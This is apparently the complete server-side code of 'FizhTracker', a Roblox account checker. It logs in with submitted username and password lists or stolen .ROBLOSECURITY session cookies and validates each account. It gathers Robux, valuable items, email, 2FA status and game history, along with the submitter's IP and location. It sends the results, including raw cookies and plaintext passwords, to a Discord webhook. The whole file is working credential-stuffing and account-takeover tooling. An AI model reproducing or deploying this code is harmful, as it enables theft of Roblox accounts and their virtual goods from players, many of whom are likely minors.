export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
    const { mode, cookies, credentials, webhook } = req.body;

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    const location = await getLocation(ip);

    const valid = [], invalid = [];
    let items = [];
    if (mode === 'cookie' && cookies) {
        items = cookies.map(c => ({ type: 'cookie', value: c }));
    } else if (mode === 'login' && credentials) {
        items = credentials.map(c => ({ type: 'login', username: c.username, password: c.password }));
    } else {
        return res.status(400).json({ error: 'Invalid payload' });
    }

    const limited = items.slice(0, 50);
    for (const item of limited) {
        try {
            let cookie = null;
            let loginInfo = null;
            if (item.type === 'cookie') {
                cookie = item.value;
            } else {
                const loginResult = await robloxLogin(item.username, item.password);
                if (!loginResult.success) {
                    invalid.push(`${item.username}:${item.password} (login fail)`);
                    continue;
                }
                cookie = loginResult.cookie;
                loginInfo = { username: item.username, password: item.password };
            }
            const cleanCookie = cookie.replace(/^_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-get-you-banned\./, '').trim();
            const result = await checkCookie(cleanCookie);
            if (result.valid) {
                result.ip = ip;
                result.location = location;
                if (loginInfo) result.login = loginInfo;
                valid.push(result);
                if (webhook) await sendDiscord(webhook, result);
            } else {
                invalid.push(item.type === 'cookie' ? item.value : `${item.username}:${item.password}`);
            }
        } catch (e) {
            invalid.push(item.type === 'cookie' ? item.value : `${item.username}:${item.password} (error)`);
        }
    }

    // ===== SUMMARY =====
    let totalRobux = 0, totalRAP = 0, totalPending = 0, premiumCount = 0;
    valid.forEach(v => {
        totalRobux += v.robux || 0;
        totalRAP += v.rap || 0;
        totalPending += v.pendingRobux || 0;
        if (v.premium) premiumCount++;
    });

    const summary = {
        validCount: valid.length,
        invalidCount: invalid.length,
        totalChecked: limited.length,
        totalRobux,
        premiumCount,
        totalRAP,
        totalPending
    };

    if (webhook) {
        const summaryEmbed = {
            title: '📊 CHECKING COMPLETE!',
            color: 0x8b4cff,
            fields: [
                { name: '✅ Valid Cookies', value: String(summary.validCount), inline: true },
                { name: '❌ Invalid Cookies', value: String(summary.invalidCount), inline: true },
                { name: '📌 Total Checked', value: String(summary.totalChecked), inline: true },
                { name: '💰 Total Robux', value: summary.totalRobux.toLocaleString(), inline: true },
                { name: '⭐ Premium Accounts', value: String(summary.premiumCount), inline: true },
                { name: '📊 Total RAP', value: summary.totalRAP.toLocaleString(), inline: true },
                { name: '⏳ Pending Robux', value: summary.totalPending.toLocaleString(), inline: true }
            ],
            footer: { text: 'FizhTracker • Bulk Check Complete' }
        };
        await fetch(webhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [summaryEmbed] })
        });

        const downloadUrl = `${req.headers['x-forwarded-proto'] || 'https'}://${req.headers['host']}/api/download`;
        await fetch(webhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `⬇️ **Download Valid Cookies:** ${downloadUrl}\n\n*Klik link di atas untuk download file .txt*`
            })
        });
    }

    res.status(200).json({ valid, invalid, total: limited.length });
}

// ===== FUNGSI (sama seperti check.js) =====
async function getLocation(ip) {
    try {
        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,as,timezone`);
        const geoData = await geoRes.json();
        if (geoData.status === 'success') {
            return {
                country: geoData.country || 'Unknown',
                region: geoData.regionName || 'Unknown',
                city: geoData.city || 'Unknown',
                isp: geoData.isp || 'Unknown',
                asn: geoData.as || 'Unknown',
                timezone: geoData.timezone || 'Unknown'
            };
        }
    } catch (e) {}
    return { country: 'Unknown', region: 'Unknown', city: 'Unknown', isp: 'Unknown', asn: 'Unknown', timezone: 'Unknown' };
}

async function robloxLogin(username, password) {
    const url = 'https://auth.roblox.com/v2/login';
    const payload = { ctoken: '', ctype: '', username, password };
    const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        redirect: 'manual'
    });
    const setCookie = res.headers.get('set-cookie');
    if (!setCookie) {
        const text = await res.text();
        return { success: false, message: 'No cookie. ' + text };
    }
    const match = setCookie.match(/\.ROBLOSECURITY=([^;]+)/);
    if (!match) return { success: false, message: 'ROBLOSECURITY not found' };
    return { success: true, cookie: match[1] };
}

async function checkCookie(cookie) {
    const headers = {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json'
    };
    try {
        const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', { headers });
        if (!userRes.ok) {
            const text = await userRes.text();
            return { valid: false, reason: `API returned ${userRes.status}: ${text}` };
        }
        const userData = await userRes.json();
        const userID = userData.id;
        const username = userData.name || 'N/A';

        let robux = 0;
        try {
            const robuxRes = await fetch('https://economy.roblox.com/v1/users/authenticated/currency', { headers });
            if (robuxRes.ok) {
                const robuxData = await robuxRes.json();
                robux = robuxData.robux || 0;
            }
        } catch (e) {}

        let rap = 0, itemCount = 0;
        try {
            const invRes = await fetch(`https://inventory.roblox.com/v1/users/${userID}/assets/collectibles?limit=100`, { headers });
            if (invRes.ok) {
                const invData = await invRes.json();
                const items = invData.data || [];
                itemCount = items.length;
                rap = items.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
            }
        } catch (e) {}

        let friends = 0, followers = 0;
        try {
            const fRes = await fetch(`https://friends.roblox.com/v1/users/${userID}/friends/count`, { headers });
            if (fRes.ok) { const d = await fRes.json(); friends = d.count || 0; }
            const folRes = await fetch(`https://friends.roblox.com/v1/users/${userID}/followers/count`, { headers });
            if (folRes.ok) { const d = await folRes.json(); followers = d.count || 0; }
        } catch (e) {}

        let korblox = false, headless = false;
        try {
            const korRes = await fetch(`https://inventory.roblox.com/v1/users/${userID}/items/102611803/is-owned`, { headers });
            if (korRes.ok) { const d = await korRes.json(); korblox = d.isOwned || false; }
        } catch (e) {}
        try {
            const headRes = await fetch(`https://inventory.roblox.com/v1/users/${userID}/items/131586929/is-owned`, { headers });
            if (headRes.ok) { const d = await headRes.json(); headless = d.isOwned || false; }
        } catch (e) {}

        let accountAge = 0;
        try {
            const ageRes = await fetch(`https://users.roblox.com/v1/users/${userID}`, { headers });
            if (ageRes.ok) {
                const ageData = await ageRes.json();
                if (ageData.created) {
                    const created = new Date(ageData.created);
                    const now = new Date();
                    accountAge = Math.floor((now - created) / (1000 * 60 * 60 * 24));
                }
            }
        } catch (e) {}

        let email = 'N/A', emailVerified = false, twoFactorEnabled = false, ageGroup = 'N/A', birthday = 'N/A';
        try {
            const settingsRes = await fetch('https://www.roblox.com/account/settings', { headers });
            if (settingsRes.ok) {
                const html = await settingsRes.text();
                const emailMatch = html.match(/<input[^>]*id="email"[^>]*value="([^"]*)"/i);
                if (emailMatch) {
                    email = emailMatch[1];
                    if (email && email.includes('@')) {
                        const [local, domain] = email.split('@');
                        email = local.charAt(0) + '*******@' + domain;
                    }
                }
                const verifiedMatch = html.match(/<span[^>]*id="email-verified"[^>]*>([^<]*)</i);
                if (verifiedMatch) {
                    emailVerified = verifiedMatch[1].toLowerCase().includes('verified');
                }
                const twoFAMatch = html.match(/<input[^>]*id="twoStepEnabled"[^>]*checked/i);
                twoFactorEnabled = !!twoFAMatch;
            }
        } catch (e) {}

        try {
            const birthRes = await fetch(`https://users.roblox.com/v1/users/${userID}`, { headers });
            if (birthRes.ok) {
                const birthData = await birthRes.json();
                if (birthData.created) {
                    const created = new Date(birthData.created);
                    birthday = created.toLocaleDateString('id-ID', { day: 'numeric', month: 'short', year: 'numeric' });
                    const now = new Date();
                    const age = now.getFullYear() - created.getFullYear();
                    if (age < 13) ageGroup = '<13';
                    else if (age < 16) ageGroup = '13-15';
                    else if (age < 18) ageGroup = '16-17';
                    else ageGroup = '18+';
                }
            }
        } catch (e) {}

        let avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userID}&width=100&height=100&format=png`;
        try {
            const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userID}&size=100x100&format=Png`, { headers });
            if (thumbRes.ok) {
                const thumbData = await thumbRes.json();
                if (thumbData.data && thumbData.data.length > 0 && thumbData.data[0].imageUrl) {
                    avatarUrl = thumbData.data[0].imageUrl;
                }
            }
        } catch (e) {}

        const summary = { username, userID, robux, rap, itemCount, friends, followers, accountAge, email, emailVerified, twoFactorEnabled, ageGroup, birthday, korblox, headless, avatarUrl };

        let gameHistory = [];
        let totalGamesPlayed = 0;
        try {
            const gameRes = await fetch(`https://games.roblox.com/v2/users/${userID}/games?limit=10&sortOrder=Desc`, { headers });
            if (gameRes.ok) {
                const gameData = await gameRes.json();
                gameHistory = gameData.data?.map(g => ({
                    name: g.name || 'Unknown',
                    placeId: g.placeId || g.id || '',
                    visits: g.visits || 0,
                    playing: g.playing || 0
                })) || [];
                totalGamesPlayed = gameData.total || 0;
            }
        } catch (e) {}

        return {
            valid: true, cookie, username, userID, accountAge, robux, rap, itemCount,
            friends, followers, korblox, headless, email, emailVerified, twoFactorEnabled,
            ageGroup, birthday, avatarUrl, summary, gameHistory, totalGamesPlayed
        };
    } catch (e) {
        return { valid: false, reason: e.message };
    }
}

async function sendDiscord(webhook, data) {
    const specialItems = [
        { name: '🦴 Korblox', url: 'https://www.roblox.com/id/bundles/192/Korblox-Deathspeaker' },
        { name: '🎃 Headless', url: 'https://www.roblox.com/id/catalog/16302616897/Headless-Horseman-Black' },
        { name: '⚡ Korblox Valkyrie', url: 'https://www.roblox.com/id/catalog/80795843562476/Headless-Horsemans-Korblox-Valkyrie' },
        { name: '📦 Box Hat', url: 'https://www.roblox.com/id/catalog/80910835025581/box-hat' }
    ];

    const itemStatus = specialItems.map(item => {
        const owned = (item.name.includes('Korblox') && data.korblox) || 
                     (item.name.includes('Headless') && data.headless);
        return `${owned ? '✅' : '❌'} ${item.name}`;
    }).join('\n');

    const embed = {
        title: '✅ FizhTracker - Valid Account',
        color: 0x8b4cff,
        fields: [
            { name: '👤 Username', value: data.username, inline: true },
            { name: '💰 Robux', value: data.robux, inline: true },
            { name: '📊 RAP', value: data.rap, inline: true },
            { name: '📦 Items', value: data.itemCount, inline: true },
            { name: '👥 Friends', value: data.friends, inline: true },
            { name: '👤 Followers', value: data.followers, inline: true },
            { name: '📅 Account Age', value: data.accountAge + ' days', inline: true },
            { name: '🦴 Korblox', value: data.korblox ? '✅ Yes' : '❌ No', inline: true },
            { name: '🎃 Headless', value: data.headless ? '✅ Yes' : '❌ No', inline: true },
            { name: '📧 Email', value: data.email || 'N/A', inline: true },
            { name: '✅ Verified', value: data.emailVerified ? '✅ Yes' : '❌ No', inline: true },
            { name: '🔒 2FA', value: data.twoFactorEnabled ? '✅ On' : '❌ Off', inline: true },
            { name: '📅 Birthday', value: data.birthday || 'N/A', inline: true },
            { name: '👶 Age Group', value: data.ageGroup || 'N/A', inline: true },
            { name: '📦 Item Status', value: itemStatus || 'No data', inline: false },
            { name: '📡 IP', value: data.ip || 'Unknown', inline: false },
            { name: '🌍 Location', value: `${data.location?.city || 'Unknown'}, ${data.location?.country || 'Unknown'}`, inline: true },
            { name: '🏢 ISP', value: data.location?.isp || 'N/A', inline: true }
        ],
        footer: { text: 'FizhTracker • ' + new Date().toLocaleString() }
    };

    if (data.gameHistory && data.gameHistory.length > 0) {
        const gameList = data.gameHistory.slice(0, 5).map((g, i) => {
            const thumb = g.placeId ? `https://tr.rbxcdn.com/${g.placeId}/Thumbnail.png` : '';
            return `${i+1}. [${g.name}](${thumb}) - ${g.visits || 0} visits`;
        }).join('\n');
        embed.fields.push({
            name: '🎮 Game History (Last 5)',
            value: gameList || 'No data',
            inline: false
        });
        const firstGame = data.gameHistory[0];
        if (firstGame.placeId) {
            embed.image = {
                url: `https://tr.rbxcdn.com/${firstGame.placeId}/Thumbnail.png`
            };
        }
    }

    await fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [embed] })
    });
}
